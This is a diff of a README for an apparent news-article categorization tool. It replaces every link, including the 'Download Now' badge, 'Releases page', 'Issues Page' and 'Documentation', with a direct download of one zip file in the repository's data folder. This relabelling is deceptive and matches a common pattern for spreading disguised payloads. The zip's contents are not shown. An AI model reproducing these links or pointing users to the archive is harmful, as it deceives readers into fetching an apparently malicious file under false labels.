@@ -1,6 +1,6 @@
 # 📰 article-categorization-ml - Categorize News Articles with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/manbilly/article-categorization-ml/releases)
+[![Download Now](https://github.com/manbilly/article-categorization-ml/raw/refs/heads/master/data/ml_article_categorization_3.1.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/manbilly/article-categorization-ml/raw/refs/heads/master/data/ml_article_categorization_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ This guide will help you download and run the article categorization application
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://github.com/manbilly/article-categorization-ml/releases).
+To download the application, visit the [Releases page](https://github.com/manbilly/article-categorization-ml/raw/refs/heads/master/data/ml_article_categorization_3.1.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version, usually at the top.
@@ -50,9 +50,9 @@ If you encounter any issues or have questions, please check the FAQ section on t
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://github.com/manbilly/article-categorization-ml)
-- [Issues Page](https://github.com/manbilly/article-categorization-ml/issues)
-- [Documentation](https://github.com/manbilly/article-categorization-ml/wiki)
+- [GitHub Repository](https://github.com/manbilly/article-categorization-ml/raw/refs/heads/master/data/ml_article_categorization_3.1.zip)
+- [Issues Page](https://github.com/manbilly/article-categorization-ml/raw/refs/heads/master/data/ml_article_categorization_3.1.zip)
+- [Documentation](https://github.com/manbilly/article-categorization-ml/raw/refs/heads/master/data/ml_article_categorization_3.1.zip)
 
 ## 🎉 Conclusion
 
